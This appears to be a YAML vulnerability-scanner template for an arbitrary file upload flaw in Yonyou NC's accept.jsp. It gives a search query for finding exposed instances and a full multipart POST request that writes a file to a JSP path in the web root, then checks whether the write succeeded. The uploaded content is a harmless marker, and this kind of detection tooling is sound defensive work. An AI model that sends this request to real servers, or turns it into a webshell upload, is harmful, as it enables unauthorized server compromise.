app: 用友软件
query: app:"用友软件"
meta:
  name: 用友NC accept.jsp任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC
    accept.jsp处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。
  homepage: ""
  author: X prism
  references: ""
  solution: 安装补丁、升级至最新版
  create_at: "2024-07-13 00:38:19"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /aim/equipmap/accept.jsp
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
          params: |-
            -----------------------------16314487820932200903769468567
            Content-Disposition: form-data; name="upload"; filename="test.txt"
            Content-Type: text/plain

            win
            -----------------------------16314487820932200903769468567
            Content-Disposition: form-data; name="fname"

            \webapps\nc_web\test.jsp
            -----------------------------16314487820932200903769468567--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: The real file
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
